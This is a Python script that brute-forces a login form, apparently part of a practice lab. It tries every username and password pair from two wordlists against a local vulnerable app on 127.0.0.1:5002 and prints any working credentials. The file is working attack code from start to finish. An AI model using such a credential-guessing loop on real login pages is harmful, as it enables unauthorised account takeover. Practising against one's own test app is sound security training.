import requests
import sys

def BrutForceLogin():
    usernames = []
    passwords = []

    try:
        with open("ethiopia.txt", "r") as f:
            usernames += [usr.strip() for usr in f]
    except Exception as e:
        print(e)
        sys.exit(1)

    try:
        with open("SubD.txt", "r") as f:
            passwords += [pas.strip() for pas in f]
    except Exception as e:
        print(e)
        sys.exit(1)

    c = 0
    url = "http://127.0.0.1:5002/login/"
    print("[#] Brute force on ", url)

    try:
        head = requests.head(url, timeout=5)
        if head.status_code == 404:
            print("[!] URL 404, please first run ** python3 VulnLogin.py")
            return
    except:
        print("[!] URL not reachable, please first run ** python3 VulnLogin.py")
        return

    print("[+] Trying combinations:", len(passwords) * len(usernames))

    for username in usernames:
        for password in passwords:
            data = {"username": username, "password": password}

            try:
                s = requests.post(url, data=data, allow_redirects=True)
                if "Welcome" in s.text:
                    print("\n[+] Success!")
                    print(f"[*] Credentials: {username}:{password}")
                    print(f"[*] Redirected to: {s.url}")
                    sys.exit()
                else:
                    c += 1
                    print(f"Attempts: {c}", end="\r")

            except Exception as e:
                print(f"Error: {e}")
                continue

    print(f"\n[-] Completed {c} attempts. No valid credentials found.")

BrutForceLogin()
